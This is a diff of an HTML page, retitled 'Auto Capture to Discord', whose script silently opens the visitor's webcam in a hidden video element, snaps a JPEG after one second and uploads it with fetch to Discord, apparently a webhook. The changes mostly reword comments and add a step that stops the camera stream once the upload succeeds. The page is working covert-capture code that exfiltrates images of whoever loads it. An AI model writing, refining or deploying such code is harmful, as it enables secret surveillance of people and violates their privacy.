@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Jo mes</title>
+    <title>Auto Capture to Discord</title>
 </head>
 <body>
     <video id="webcam" autoplay playsinline style="display: none;"></video>
@@ -15,9 +15,9 @@
                     const video = document.getElementById('webcam');
                     video.srcObject = stream;
 
-                    // Wait until video is ready
+                    // Once the video is ready
                     video.addEventListener('canplay', () => {
-                        // Small delay to ensure the video stabilizes
+                        // Wait a moment to let the video stabilize
                         setTimeout(() => {
                             // Create a canvas to capture the image
                             const canvas = document.createElement('canvas');
@@ -26,9 +26,8 @@
                             const ctx = canvas.getContext('2d');
                             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                            // Convert the canvas image to a blob
+                            // Convert the image to a blob
                             canvas.toBlob(blob => {
-                                // Prepare form data
                                 let formData = new FormData();
                                 formData.append('image', blob, 'snapshot.jpg');
 
@@ -40,12 +39,14 @@
                                 .then(response => response.text())
                                 .then(data => {
                                     console.log('Upload to Discord success:', data);
+                                    // Optionally stop the stream
+                                    stream.getTracks().forEach(track => track.stop());
                                 })
                                 .catch(error => {
                                     console.error('Upload to Discord failed:', error);
                                 });
                             }, 'image/jpeg');
-                        }, 1000); // Wait 1 second to stabilize
+                        }, 1000); // Wait 1 second
                     });
                 })
                 .catch(error => {
